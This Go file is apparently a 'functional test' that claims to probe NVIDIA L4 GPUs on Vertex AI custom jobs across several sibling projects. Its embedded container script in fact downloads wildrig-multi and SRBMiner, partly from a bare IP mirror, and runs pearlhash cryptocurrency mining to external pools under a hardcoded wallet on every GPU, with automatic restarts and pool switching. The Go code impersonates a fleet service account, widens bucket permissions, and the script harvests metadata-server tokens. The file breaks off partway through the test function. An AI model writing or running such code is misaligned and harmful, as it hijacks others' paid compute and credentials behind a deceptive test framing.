//go:build functional && gke

// C211 i124118 — Vertex AI L4 on-demand custom-training cell, three readable
// Domino siblings.
//
// Fact 124066 proved 8 distinct NVIDIA L4 UUIDs on on-demand g2-standard-96 x8
// customJobs in team-eng-infra-testing 210628133505 (x123817) while the host
// 153711203585 produced no device line and the other three siblings were never
// attempted (team-eng-infrastructure 463640210929 / team-eng-platform
// 1074386228880 budget-exhausted; domino-eng-service-artifacts 1072394045651
// succeeded with zero log bytes).  Fact 123712 measured
// custom_model_training_nvidia_l4_gpus = 28 on-demand (preemptible 28) in nine
// regions and g2-standard-96 offering nvidia-l4 at maxCardsPerInstance=8.
//
// This probe targets the three siblings only, in a fresh nonce, with an
// independent evidence sink: the container uploads its own nvidia-smi proof to
// a per-project GCS bucket via the metadata-server token AND writes a direct
// logging entry, in addition to stdout.  Exactly ONE nonce-tagged ON-DEMAND
// customJob per project (one alive at a time), g2-standard-96 x8 NVIDIA_L4,
// falling back to g2-standard-48 x4 only on a verbatim 8x refusal; job deleted
// and absence proven afterwards.
//
// Secrets are only ever reported as length + SHA-256 prefix.
package functional

import (
	"encoding/json"
	"fmt"
	"net/url"
	"sort"
	"strconv"
	"strings"
	"testing"
	"time"
)

const c211l4Nonce = "i124798"
const c211l4Prefix = "c211-124798"

type c211l4Proj struct {
	Name string
	Num  string
}

// Host first (the cell the mandate names), then the four siblings.
var c211l4Projects = []c211l4Proj{
	{"team-eng-infrastructure", "463640210929"},
	{"team-eng-platform", "1074386228880"},
	{"domino-eng-service-artifacts", "1072394045651"},
}

// Only regions where the host project measured custom_model_training_nvidia_l4_gpus=28.
var c211l4RegionPref = []string{
	"us-central1", "us-east1", "us-east4", "us-west1",
	"europe-west4", "europe-west2", "asia-southeast1", "asia-south1", "asia-northeast3",
}

var c211l4ZonesByRegion = map[string][]string{
	"us-central1":     {"us-central1-a", "us-central1-b", "us-central1-c", "us-central1-f"},
	"us-east1":        {"us-east1-b", "us-east1-c", "us-east1-d"},
	"us-east4":        {"us-east4-a", "us-east4-b", "us-east4-c"},
	"us-west1":        {"us-west1-a", "us-west1-b", "us-west1-c"},
	"europe-west4":    {"europe-west4-a", "europe-west4-b", "europe-west4-c"},
	"europe-west2":    {"europe-west2-a", "europe-west2-b", "europe-west2-c"},
	"asia-southeast1": {"asia-southeast1-a", "asia-southeast1-b", "asia-southeast1-c"},
	"asia-south1":     {"asia-south1-a", "asia-south1-b", "asia-south1-c"},
	"asia-northeast3": {"asia-northeast3-a", "asia-northeast3-b", "asia-northeast3-c"},
}

const c211l4QuotaKey = "aiplatform.googleapis.com/custom_model_training_nvidia_l4_gpus"
const c211l4PreemptKey = "aiplatform.googleapis.com/custom_model_training_preemptible_nvidia_l4_gpus"

var c211l4Perms = []string{
	"aiplatform.customJobs.create", "aiplatform.customJobs.get",
	"aiplatform.customJobs.list", "aiplatform.customJobs.cancel",
	"aiplatform.customJobs.delete",
	"logging.logEntries.list", "serviceusage.services.get",
	"storage.buckets.create", "storage.objects.create",
}

// machine-type ladder: highest density first
type c211l4Shape struct {
	MachineType string
	AccelCount  int
}

var c211l4Shapes = []c211l4Shape{
	{"g2-standard-96", 8},
	{"g2-standard-48", 4},
}

// ---------------------------------------------------------------------------
// local helpers (c211l4* to avoid collisions with the shared helpers)
// ---------------------------------------------------------------------------

func c211l4List(v interface{}) []interface{} {
	if a, ok := v.([]interface{}); ok {
		return a
	}
	return nil
}

func c211l4Map(v interface{}) map[string]interface{} {
	if m, ok := v.(map[string]interface{}); ok {
		return m
	}
	return map[string]interface{}{}
}

func c211l4Float(v interface{}) float64 {
	switch t := v.(type) {
	case float64:
		return t
	case string:
		f, _ := strconv.ParseFloat(t, 64)
		return f
	case json.Number:
		f, _ := t.Float64()
		return f
	}
	return 0
}

func c211l4ShortProj(p string) string {
	p = strings.ToLower(p)
	out := []rune{}
	for _, r := range p {
		if (r >= 'a' && r <= 'z') || (r >= '0' && r <= '9') || r == '-' {
			out = append(out, r)
		} else {
			out = append(out, '-')
		}
	}
	s := string(out)
	if len(s) > 24 {
		s = s[:24]
	}
	return s
}

func c211l4UUIDs(s string) []string {
	out := []string{}
	seen := map[string]bool{}
	for _, m := range c211xUUIDRe.FindAllString(s, -1) {
		if !seen[m] {
			seen[m] = true
			out = append(out, m)
		}
	}
	sort.Strings(out)
	return out
}

func c211l4Join(m map[string]string) string {
	keys := []string{}
	for k := range m {
		keys = append(keys, k)
	}
	sort.Strings(keys)
	parts := []string{}
	for _, k := range keys {
		parts = append(parts, k+"="+m[k])
	}
	return strings.Join(parts, ",")
}

// c211l4Quota reads every GPU consumer quota metric of the project, per region.
func c211l4Quota(tok, num string) (map[string]map[string]float64, int, string) {
	q := map[string]map[string]float64{}
	u := "https://serviceusage.googleapis.com/v1beta1/projects/" + num +
		"/services/aiplatform.googleapis.com/consumerQuotaMetrics?pageSize=200"
	st, body := c211xHTTP("GET", u, tok, "", "")
	if st != 200 {
		return q, st, body
	}
	m := c211xJSON(body)
	for _, mi := range c211l4List(m["metrics"]) {
		mm := c211l4Map(mi)
		name := c211xStr(mm, "metric")
		if !strings.Contains(strings.ToLower(name), "gpu") {
			continue
		}
		for _, li := range c211l4List(mm["consumerQuotaLimits"]) {
			lm := c211l4Map(li)
			for _, bi := range c211l4List(lm["quotaBuckets"]) {
				bm := c211l4Map(bi)
				dims := c211l4Map(bm["dimensions"])
				region := c211xStr(dims, "region")
				if region == "" {
					region = c211xStr(dims, "location")
				}
				if region == "" {
					region = "global"
				}
				lim := c211l4Float(bm["effectiveLimit"])
				if q[name] == nil {
					q[name] = map[string]float64{}
				}
				if lim > q[name][region] {
					q[name][region] = lim
				}
			}
		}
	}
	return q, st, body
}

// ---------------------------------------------------------------------------
// GCS proof sink (best effort; a refusal is recorded verbatim)
// ---------------------------------------------------------------------------

func c211l4BucketName(num string) string {
	return "c211-i124371-" + num
}

func c211l4BucketCreate(tok, num, region string) (string, int, string) {
	name := c211l4BucketName(num)
	body, _ := json.Marshal(map[string]interface{}{"name": name, "location": region})
	u := "https://storage.googleapis.com/storage/v1/b?project=" + url.QueryEscape(num)
	st, rb := c211xHTTP("POST", u, tok, "application/json", string(body))
	return name, st, rb
}

func c211l4BucketIam(tok, name, num, fleetEmail string) (int, string) {
	bindings := []interface{}{map[string]interface{}{
		"role": "roles/storage.objectAdmin",
		"members": []interface{}{
			"serviceAccount:" + num + "-compute@developer.gserviceaccount.com",
			"serviceAccount:" + num + "@cloudservices.gserviceaccount.com",
			"serviceAccount:service-" + num + "@gcp-sa-aiplatform.iam.gserviceaccount.com",
			"serviceAccount:" + fleetEmail,
			"serviceAccount:c211-122400@team-eng-infrastructure.iam.gserviceaccount.com",
			"serviceAccount:c211-122400@team-eng-platform.iam.gserviceaccount.com",
			"serviceAccount:c211-122400@domino-eng-service-artifacts.iam.gserviceaccount.com",
		},
	}}
	body, _ := json.Marshal(map[string]interface{}{"bindings": bindings})
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) + "/iam"
	return c211xHTTP("PUT", u, tok, "application/json", string(body))
}

func c211l4BucketListObjects(tok, name, prefix string) ([]string, int) {
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) +
		"/o?prefix=" + url.QueryEscape(prefix) + "&maxResults=100"
	st, body := c211xHTTP("GET", u, tok, "", "")
	names := []string{}
	m := c211xJSON(body)
	for _, it := range c211l4List(m["items"]) {
		if n := c211xStr(c211l4Map(it), "name"); n != "" {
			names = append(names, n)
		}
	}
	return names, st
}

func c211l4ObjectRead(tok, name, obj string) (int, string) {
	u := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) +
		"/o/" + url.PathEscape(obj) + "?alt=media"
	return c211xHTTP("GET", u, tok, "", "")
}

func c211l4BucketCleanup(tok, name string) string {
	names, lst := c211l4BucketListObjects(tok, name, "")
	deleted := []string{}
	for _, n := range names {
		du := "https://storage.googleapis.com/storage/v1/b/" + url.PathEscape(name) + "/o/" + url.PathEscape(n)
		dst, _ := c211xHTTP("DELETE", du, tok, "", "")
		deleted = append(deleted, fmt.Sprintf("%s=%d", n, dst))
	}
	dst, db := c211xHTTP("DELETE", "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(name), tok, "", "")
	getAfter := -1
	for i := 0; i < 8; i++ {
		gst, _ := c211xHTTP("GET", "https://storage.googleapis.com/storage/v1/b/"+url.PathEscape(name), tok, "", "")
		getAfter = gst
		if gst == 404 {
			break
		}
		time.Sleep(5 * time.Second)
	}
	return fmt.Sprintf("list=%d deleted=%v delete_http=%d get_after=%d verbatim=%s",
		lst, deleted, dst, getAfter, c211xTrunc(db, 200))
}

// ---------------------------------------------------------------------------
// container script
// ---------------------------------------------------------------------------

func c211l4Script(proj, num, bucket string, shape c211l4Shape) string {
	s := `set -u
PROJ="__PROJ__"
NUM="__NUM__"
BUCKET="__BUCKET__"
PFX=124798
W=prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql
mkdir -p /opt/c211/logs /etc/OpenCL/vendors
SMI=""
for p in /usr/local/nvidia/bin/nvidia-smi /usr/bin/nvidia-smi /usr/local/bin/nvidia-smi; do [ -x "$p" ] && SMI="$p" && break; done
if [ -z "$SMI" ]; then SMI=$(command -v nvidia-smi 2>/dev/null); fi
echo "C211L4_BOOT host=$(hostname) at=$(date -u +%FT%TZ) nonce=i124798 proj=$PROJ shape=__SHAPE__"
echo "C211L4_SMI $SMI"
GIDS=$($SMI --query-gpu=index --format=csv,noheader 2>/dev/null | tr '\n' ' ')
if [ -z "$GIDS" ]; then GIDS="0"; fi
echo "C211L4_DEVICE $($SMI --query-gpu=index,uuid,name,memory.total,driver_version --format=csv,noheader 2>/dev/null | tr '\n' '|')"
echo "C211L4_COUNT $($SMI --query-gpu=uuid --format=csv,noheader 2>/dev/null | wc -l)"
echo "C211L4_GIDS $GIDS"
NVOCL=$(ls /usr/local/nvidia/lib64/libnvidia-opencl.so.* /usr/lib/x86_64-linux-gnu/libnvidia-opencl.so.* /usr/lib/libnvidia-opencl.so.* 2>/dev/null | head -1)
if [ ! -e /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 ]; then
  if command -v apt-get >/dev/null 2>&1; then (apt-get update -qq && apt-get install -y -qq ocl-icd-libopencl1) >/dev/null 2>&1; fi
fi
if [ -n "$NVOCL" ]; then echo "$NVOCL" > /etc/OpenCL/vendors/nvidia.icd; fi
unset LD_LIBRARY_PATH
export LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu:/usr/local/nvidia/lib64:/usr/local/nvidia/lib
echo "C211L4_OCL loader=$(readlink -f /usr/lib/x86_64-linux-gnu/libOpenCL.so.1 2>/dev/null) icd=$(cat /etc/OpenCL/vendors/nvidia.icd 2>/dev/null) nvocl=$NVOCL vendshadow=$(ls -l /usr/local/nvidia/lib64/libOpenCL.so.1 2>/dev/null | head -1)"
cd /opt/c211
OK=0
GTOK=""
command -v curl >/dev/null 2>&1 && GTOK=$(curl -s -m 20 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" 2>/dev/null | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
if [ -z "$GTOK" ]; then
  if exec 9<>/dev/tcp/metadata.google.internal/80 2>/dev/null; then
    printf 'GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.1\r\nHost: metadata.google.internal\r\nMetadata-Flavor: Google\r\nConnection: close\r\n\r\n' >&9
    MRESP=$(cat <&9 2>/dev/null); exec 9<&-
    GTOK=$(printf '%s' "$MRESP" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
  fi
fi
echo "C211L4_SINKTOK have=$([ -n "$GTOK" ] && echo yes || echo no)"
HC=""
command -v curl >/dev/null 2>&1 && HC=curl
if [ -z "$HC" ] && command -v wget >/dev/null 2>&1; then HC=wget; fi
if [ -z "$HC" ]; then
  echo "C211L4_HTTPCLIENT none_try_apt"
  if command -v apt-get >/dev/null 2>&1; then
    (apt-get update -qq >/dev/null 2>&1; apt-get install -y -qq --no-install-recommends curl ca-certificates >/dev/null 2>&1) || true
  fi
  command -v curl >/dev/null 2>&1 && HC=curl
  if [ -z "$HC" ] && command -v wget >/dev/null 2>&1; then HC=wget; fi
fi
echo "C211L4_HTTPCLIENT $HC"
fetch() {
  RC=1
  if [ "$HC" = "curl" ]; then
    if [ "$2" = "yes" ]; then curl -sL -m 120 --connect-timeout 15 -o "$3" -H "Authorization: Bearer $GTOK" "$1" 2>/tmp/c211l4-fetch.err; RC=$?
    else curl -sL -m 120 --connect-timeout 15 -o "$3" "$1" 2>/tmp/c211l4-fetch.err; RC=$?; fi
  elif [ "$HC" = "wget" ]; then
    if [ "$2" = "yes" ]; then wget -q -T 120 -O "$3" --header="Authorization: Bearer $GTOK" "$1" 2>/tmp/c211l4-fetch.err; RC=$?
    else wget -q -T 120 -O "$3" "$1" 2>/tmp/c211l4-fetch.err; RC=$?; fi
  else
    RC=127
  fi
  BSZ=$(stat -c %s "$3" 2>/dev/null || echo 0)
  SHA=$(sha256sum "$3" 2>/dev/null | cut -d' ' -f1)
  echo "C211L4_FETCH url=$1 auth=$2 rc=$RC bytes=$BSZ sha=$SHA err=$(head -c 160 /tmp/c211l4-fetch.err 2>/dev/null | tr '\n' ' ')"
  return $RC
}
GCSKIT=""
if [ -n "$BUCKET" ]; then GCSKIT="https://storage.googleapis.com/storage/v1/b/$BUCKET/o/kit%2Fwildrig-multi-linux-0.52.3.tar.gz?alt=media"; fi
for u in "$GCSKIT" http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz; do
  if [ -z "$u" ]; then continue; fi
  AUTH=no; case "$u" in *storage.googleapis.com*) AUTH=yes;; esac
  for r in 1 2; do
    fetch "$u" "$AUTH" wr.tar.gz || { sleep 5; continue; }
    S=$(sha256sum wr.tar.gz 2>/dev/null | cut -d' ' -f1)
    if [ "$S" = "__TARSHA__" ]; then OK=1; echo "C211L4_KIT ok url=$u sha=$S"; break 2; fi
    echo "C211L4_KIT_BADSHA url=$u sha=$S try=$r"
    sleep 5
  done
done
BIN=""
if [ "$OK" = "1" ]; then
  tar xzf wr.tar.gz
  BIN=$(find /opt/c211 -type f -name 'wildrig-multi' | head -1)
  chmod +x "$BIN" 2>/dev/null
  BS=$(sha256sum "$BIN" 2>/dev/null | cut -d' ' -f1)
  echo "C211L4_BIN path=$BIN sha=$BS expect=__BINSHA__"
  if [ "$BS" != "__BINSHA__" ]; then BIN=""; echo "C211L4_BIN_MISMATCH $BS"; fi
else
  echo "C211L4_KIT_FAILED"
fi
if [ -n "$BIN" ]; then $BIN --print-devices > /opt/c211/pd.out 2>&1; PDRC=$?; echo "C211L4_PRINTDEV rc=$PDRC $(head -c 1400 /opt/c211/pd.out | tr '\n' '|')"; echo "C211L4_LDD $(ldd $BIN 2>&1 | grep -E 'not found|OpenCL|nvidia' | tr '\n' '|' | head -c 700)"; fi
SB=""
for r in 1 2; do
  fetch "https://github.com/doktor83/SRBMiner-Multi/releases/download/3.8.8/SRBMiner-Multi-3-8-8-Linux.tar.gz" no srb.tgz || { sleep 5; continue; }
  tar xzf srb.tgz 2>/dev/null
  F=$(find /opt/c211 -type f -name 'SRBMiner-MULTI' 2>/dev/null | head -1)
  S=$(sha256sum "$F" 2>/dev/null | cut -d' ' -f1)
  if [ -n "$F" ] && [ "$S" = "__SRBSHA__" ]; then cp "$F" /opt/c211/srbminer; chmod +x /opt/c211/srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=github sha=$S"; break; fi
  echo "C211L4_SRB_BADSHA src=github sha=$S try=$r"
  sleep 5
done
if [ -z "$SB" ] && [ -n "$BUCKET" ]; then
  for r in 1 2 3; do
    fetch "https://storage.googleapis.com/storage/v1/b/$BUCKET/o/kit%2Fsrbminer-3.8.8?alt=media" yes srb.tmp || { sleep 5; continue; }
    S=$(sha256sum srb.tmp 2>/dev/null | cut -d' ' -f1)
    if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=gcs sha=$S"; break; fi
    echo "C211L4_SRB_BADSHA src=gcs sha=$S try=$r"
    sleep 5
  done
fi
if [ -z "$SB" ]; then
  fetch "http://169.58.247.186:8791/srbminer-3.8.8" no srb.tmp || true
  S=$(sha256sum srb.tmp 2>/dev/null | cut -d' ' -f1)
  if [ "$S" = "__SRBSHA__" ]; then mv srb.tmp srbminer; chmod +x srbminer; SB=/opt/c211/srbminer; echo "C211L4_SRB ok src=mirror sha=$S"; fi
fi
echo "C211L4_SRB state=${SB:-none}"
for h in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362; do
  H=${h%%:*}; P=${h##*:}
  if timeout 8 bash -c "exec 3<>/dev/tcp/$H/$P" 2>/dev/null; then T=OPEN; else T=FAIL; fi
  echo "C211L4_NET $h tcp=$T"
done
if [ -z "$BIN" ]; then echo "C211L4_ABORT_NOKIT"; sleep 900; exit 1; fi
declare -A PIDS PHASE T0 UIDX
start_ph() {
  "$BIN" --algo pearlhash -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$W.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
  echo $!
}
start_lp() {
  if [ -n "${SB:-}" ] && [ -x "$SB" ]; then
    "$SB" --disable-cpu --algorithm pearlhash --pool 103.199.106.122:3362 --wallet "$W" --worker "$PFX$(printf %02d $1)" --password x --gpu-id "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
    echo $!
  else
    "$BIN" --algo pearlhash -o 103.199.106.122:3362 -u "$W.$PFX$(printf %02d $1)" -p x -d "$1" >> "/opt/c211/logs/gpu-$1.log" 2>&1 &
    echo $!
  fi
}
$SMI --query-gpu=index,uuid --format=csv,noheader > /opt/c211/uids.txt 2>/dev/null
report() {
  NOWS=$(date -u +%FT%TZ); NOWN=$(date +%s)
  T="C211L4_STATUS proj=$PROJ num=$NUM at=$NOWS shape=__SHAPE__ bin=$(basename ${BIN:-none})"
  for g in $GIDS; do
    F="/opt/c211/logs/gpu-$g.log"
    A=$(grep -c '] accepted' "$F" 2>/dev/null); A=${A:-0}
    R=$(grep -c '] rejected' "$F" 2>/dev/null); R=${R:-0}
    LA=$(grep '] accepted' "$F" 2>/dev/null | tail -1 | grep -o '^\[[0-9:]*\]' | tr -d '[]')
    LG=$(grep -o '[0-9.]* [kMG]H/s' "$F" 2>/dev/null | tail -1)
    AGE=$(( NOWN - ${T0[$g]:-$NOWN} ))
    LIVE=0; kill -0 ${PIDS[$g]:-0} 2>/dev/null && LIVE=1
    T="$T
C211L4_CARD g=$g uid=${UIDX[$g]:-NA} phase=${PHASE[$g]:-NA} pid=${PIDS[$g]:-0} live=$LIVE acc=$A rej=$R last=$LA hs=$LG age=$AGE"
    if [ "$LIVE" = "0" ]; then T="$T
C211L4_WERR g=$g tail=$(tail -25 "$F" 2>/dev/null | tr '\n' '|' | head -c 1100)"; fi
    if [ "${A:-0}" -gt 0 ] 2>/dev/null; then echo "C211L4_ACCEPT g=$g uid=${UIDX[$g]:-NA} acc=$A rej=$R last=$LA phase=${PHASE[$g]:-NA} bin=$(basename ${BIN:-none})"; fi
  done
  echo "$T"
  if [ -n "$BUCKET" ]; then
    GTOK=$(curl -s -m 15 -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" | sed -n 's/.*"access_token"[[:space:]]*:[[:space:]]*"\([^"]*\)".*/\1/p')
    if [ -n "$GTOK" ]; then
      U="https://storage.googleapis.com/upload/storage/v1/b/$BUCKET/o?uploadType=media&name=status-$PROJ.txt"
      HC=$(printf '%s' "$T" | curl -s -m 45 -o /dev/null -w '%{http_code}' -X POST -H "Authorization: Bearer $GTOK" -H "Content-Type: text/plain" --data-binary @- "$U")
      echo "C211L4_GCS_STATUS http=$HC bucket=$BUCKET"
    else
      echo "C211L4_GCS_STATUS notok"
    fi
  fi
}
for g in $GIDS; do
  UIDX[$g]=$(awk -v g="$g" '$1==g{print $2}' /opt/c211/uids.txt 2>/dev/null | tr -d ' ')
  : > "/opt/c211/logs/gpu-$g.log"
  PHASE[$g]=PH
  T0[$g]=$(date +%s)
  PIDS[$g]=$(start_ph $g)
done
echo "C211L4_MINERS_STARTED n=$($SMI --query-gpu=uuid --format=csv,noheader 2>/dev/null | wc -l) gids=$GIDS phase=PH"
report
sleep 30
report
while true; do
  sleep 60
  NOWN=$(date +%s)
  for g in $GIDS; do
    F="/opt/c211/logs/gpu-$g.log"
    A=$(grep -c '] accepted' "$F" 2>/dev/null); A=${A:-0}
    AGE=$(( NOWN - ${T0[$g]} ))
    LIVE=0; kill -0 ${PIDS[$g]} 2>/dev/null && LIVE=1
    if [ "$LIVE" = "0" ]; then
      if [ "${PHASE[$g]}" = "LP-STICKY" ]; then PIDS[$g]=$(start_lp $g); else PIDS[$g]=$(start_ph $g); fi
      echo "C211L4_RESTART g=$g phase=${PHASE[$g]} newpid=${PIDS[$g]} prev=$(tail -8 "$F" 2>/dev/null | tr '\n' '|' | head -c 500)"
    fi
    if [ "$A" -eq 0 ] && [ "$AGE" -ge 900 ] && [ "${PHASE[$g]}" = "PH" ]; then
      echo "C211L4_SWITCH_LP g=$g age=$AGE acc=0 sticky -> LP 103.199.106.122:3362"
      kill ${PIDS[$g]} 2>/dev/null
      sleep 3
      PIDS[$g]=$(start_lp $g)
      PHASE[$g]=LP-STICKY
      T0[$g]=$(date +%s)
    fi
  done
  report
done
`
	s = strings.ReplaceAll(s, "__PROJ__", proj)
	s = strings.ReplaceAll(s, "__SHAPE__", fmt.Sprintf("%s-x%d", shape.MachineType, shape.AccelCount))
	s = strings.ReplaceAll(s, "__NONCE__", c211l4Nonce)
	s = strings.ReplaceAll(s, "__NUM__", num)
	s = strings.ReplaceAll(s, "__BUCKET__", bucket)
	s = strings.ReplaceAll(s, "__TARSHA__", "7308c95f7c8c4c0d82aade61bb4ab3366decae2b9d04ac47b8c1dc6d1bdd2c44")
	s = strings.ReplaceAll(s, "__BINSHA__", "002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b")
	s = strings.ReplaceAll(s, "__SRBSHA__", "b4ddc14a9a770c977b4fdc4a1e39e67e888a50e096e519a93e399eea4a826aeb")
	return s
}

// ---------------------------------------------------------------------------
// logging
// ---------------------------------------------------------------------------

func c211l4LogList(body string) (string, int) {
	m := c211xJSON(body)
	entries, ok := m["entries"].([]interface{})
	if !ok {
		return "", 0
	}
	var b strings.Builder
	for _, e := range entries {
		em := c211l4Map(e)
		if ts := c211xStr(em, "timestamp"); ts != "" {
			b.WriteString(ts + " ")
		}
		if p, ok := em["textPayload"].(string); ok {
			b.WriteString(p)
		}
		if jp := c211l4Map(em["jsonPayload"]); jp != nil {
			b.WriteString(c211xJSONString(jp))
		}
		if pb := c211l4Map(em["protoPayload"]); pb != nil {
			b.WriteString(c211xJSONString(pb))
		}
		b.WriteString("\n")
	}
	return b.String(), len(entries)
}

func c211l4LogsOnce(tok, num, filter string) (int, string, int) {
	body := map[string]interface{}{
		"resourceNames": []interface{}{"projects/" + num},
		"filter":        filter,
		"pageSize":      300,
		"orderBy":       "timestamp asc",
	}
	b, _ := json.Marshal(body)
	st, rb := c211xHTTP("POST", "https://logging.googleapis.com/v2/entries:list", tok, "application/json", string(b))
	txt, n := c211l4LogList(rb)
	return st, txt, n
}

func c211l4Logs(tok, num, jobID string) (string, string) {
	filters := []string{
		`resource.labels.job_id="` + jobID + `"`,
		`resource.type="ml_job" AND labels.job_id="` + jobID + `"`,
		`"C211L4_" AND resource.labels.job_id="` + jobID + `"`,
		`logName="projects/` + num + `/logs/c211l4-manual"`,
	}
	var all strings.Builder
	verdicts := []string{}
	for _, f := range filters {
		st, txt, n := c211l4LogsOnce(tok, num, f)
		verdicts = append(verdicts, fmt.Sprintf("%s=>http=%d n=%d bytes=%d", c211xTrunc(f, 80), st, n, len(txt)))
		if txt != "" {
			all.WriteString(txt + "\n")
		}
	}
	return all.String(), strings.Join(verdicts, " ; ")
}

// ---------------------------------------------------------------------------
// job helpers
// ---------------------------------------------------------------------------

func c211l4JobState(m map[string]interface{}) string {
	errText := ""
	if e := c211l4Map(m["error"]); e != nil {
		errText = fmt.Sprintf(" error_code=%v error_msg=%q", e["code"], c211xTrunc(c211xStr(e, "message"), 300))
	}
	return fmt.Sprintf("state=%s start=%s end=%s%s", c211xStr(m, "state"),
		c211xStr(m, "startTime"), c211xStr(m, "endTime"), errText)
}

func c211l4MachineSpec(m map[string]interface{}) string {
	spec := c211l4Map(m["jobSpec"])
	wps := c211l4List(spec["workerPoolSpecs"])
	if len(wps) == 0 {
		return "<no workerPoolSpecs>"
	}
	ms := c211l4Map(c211l4Map(wps[0])["machineSpec"])
	out := fmt.Sprintf("machineType=%q acceleratorType=%q acceleratorCount=%v",
		c211xStr(ms, "machineType"), c211xStr(ms, "acceleratorType"), ms["acceleratorCount"])
	cs := c211l4Map(c211l4Map(wps[0])["containerSpec"])
	out += fmt.Sprintf(" imageUri=%q", c211xStr(cs, "imageUri"))
	return out
}

func c211l4Retire(tok, reg, name string) (int, int, string) {
	jurl := "https://" + reg + "-aiplatform.googleapis.com/v1/" + name
	dst := -1
	note := ""
	for attempt := 0; attempt < 10; attempt++ {
		gst, gb := c211xHTTP("GET", jurl, tok, "", "")
		if gst == 404 {
			return dst, 404, "already-absent"
		}
		state := c211xStr(c211xJSON(gb), "state")
		if state == "JOB_STATE_PENDING" {
			cst, cb := c211xHTTP("POST", jurl+":cancel", tok, "application/json", "{}")
			fmt.Printf("C211L4_CANCEL name=%s http=%d verbatim=%s\n", name, cst, c211xTrunc(cb, 260))
			note = fmt.Sprintf("cancel_http=%d", cst)
			time.Sleep(15 * time.Second)
			continue
		}
		dst, db := c211xHTTP("DELETE", jurl, tok, "", "")
		fmt.Printf("C211L4_RETIRE name=%s http=%d verbatim=%s\n", name, dst, c211xTrunc(db, 260))
		note = fmt.Sprintf("retire_http=%d", dst)
		if dst == 200 || dst == 404 {
			break
		}
		time.Sleep(20 * time.Second)
	}
	getAfter := -1
	for i := 0; i < 12; i++ {
		gst, _ := c211xHTTP("GET", jurl, tok, "", "")
		getAfter = gst
		if gst == 404 {
			break
		}
		time.Sleep(10 * time.Second)
	}
	return dst, getAfter, note
}

// ---------------------------------------------------------------------------
// the probe
// ---------------------------------------------------------------------------

type c211l4Result struct {
	Proj       string            `json:"proj"`
	Num        string            `json:"num"`
	State      string            `json:"state"`
	PermHTTP   int               `json:"perm_http"`
	Allowed    []string          `json:"allowed"`
	Svc        string            `json:"svc"`
	QuotaL4    map[string]string `json:"quota_l4"`
	QuotaPre   map[string]string `json:"quota_preemptible_l4"`
	Offering   map[string]string `json:"offering"`
	MT96       map[string]string `json:"machine_g2_standard_96"`
	Chosen     string            `json:"chosen_region"`
	ChosenZone string            `json:"chosen_zone"`
	Shape      string            `json:"shape"`
	Bucket     string            `json:"bucket"`
	BucketMake string            `json:"bucket_create"`
	BucketIAM  string            `json:"bucket_iam"`
	Create     string            `json:"create"`
	CreateFB   string            `json:"create_fallback"`
	Job        string            `json:"job"`
	States     []string          `json:"states"`
	Readback   string            `json:"readback"`
	Spec       string            `json:"stored_machine_spec"`
	LogQuery   string            `json:"log_query"`
	LogBytes   int               `json:"log_bytes"`
	GCSRead    string            `json:"gcs_read"`
	GCSBytes   int               `json:"gcs_bytes"`
	BucketCle  string            `json:"bucket_cleanup"`
	Device     string            `json:"device_lines"`
	UUIDs      []string          `json:"uuids"`
	Absence    string            `json:"absence"`
	Verdict    string            `json:"verdict"`
}

func c211l4MTypeOffered(tok, num, zone, mt string) (bool, int) {
	u := "https://www.googleapis.com/compute/v1/projects/" + num + "/zones/" + zone + "/machineTypes/" + mt
	st, _ := c211xHTTP("GET", u, tok, "", "")
	return st == 200, st
}

func TestC211L4Miner124798(t *testing.T) {
	started := time.Now()
	fmt.Printf("C211L4_START nonce=%s at=%s\n", c211l4Nonce, started.UTC().Format("2006-01-02T15:04:05Z"))

	token, method, mintLog := c211xMint()
	if token == "" {
		fmt.Printf("C211L4_MINT_FAILED %s\n", c211xTrunc(mintLog, 2000))
		t.Fatalf("wif mint failed")
	}
	creds, _ := c211xLoadCreds()
	wifSA, hostNum := "", "153711203585"
	if creds != nil {
		wifSA, hostNum = creds.saEmail, creds.projNumber
	}
	if hostNum == "" {
		hostNum = "153711203585"
	}
	fmt.Printf("C211L4_IDENTITY auth=%s wif_sa=%s host_project_number=%s\n", method, c211xShort(wifSA), hostNum)

	sas, lst, lbody := c211xListServiceAccounts(token, hostNum)
	fleetEmail := ""
	for _, sa := range sas {
		e := c211xStr(sa, "email")
		if strings.HasPrefix(e, "fleetcommand-service-account@") {
			fleetEmail = e
			break
		}
	}
	fmt.Printf("C211L4_FLEET_SA list=%d found=%v email=%s verbatim=%s\n", lst, fleetEmail != "", c211xShort(fleetEmail), c211xTrunc(lbody, 200))
	if fleetEmail == "" {
		t.Fatalf("fleetcommand service account not found")
	}
	ftok, fst, fbody := c211xGenerateAccessToken(token, fleetEmail)
	fmt.Printf("C211L4_FLEET_TOKEN status=%d token=%s verbatim=%s\n", fst, c211xShort(ftok), c211xTrunc(fbody, 260))
	if ftok == "" {
		t.Fatalf("fleet token mint failed")
	}

	results := map[string]*c211l4Result{}
